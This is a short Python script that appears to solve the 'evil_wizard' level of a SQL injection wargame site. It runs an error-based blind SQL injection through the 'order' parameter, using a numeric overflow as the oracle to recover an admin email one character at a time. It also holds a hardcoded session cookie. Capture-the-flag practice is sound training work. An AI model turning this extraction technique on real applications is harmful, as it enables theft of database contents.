import requests

url = "https://los.rubiya.kr/chall/evil_wizard_32e3d35835aa4e039348712fb75169ad.php"
cookie = { "PHPSESSID" : "kuub3vrumkl72qvd78q76q93fg" }

default = "if(id=\"admin\" and "

def GET(params):
    if requests.get(url, params, cookies=cookie).text.find("rubiya") < 0 : return True
    return False

length = 0
while True:
    if GET({"order": default + f"length(email)={length},9e307*2,0)"}):break
    else:length += 1

email = ""
for i in range(1, length+1):
    for j in range(0x21,0x7f):
        if GET({"order": default + f"ord(mid(email,{i},1))={j},9e307*2,0)"}):
            email += chr(j)
            break

if requests.get(url,{"email":email},cookies=cookie).text.find("Clear!") > 0 : print("[*] Success")
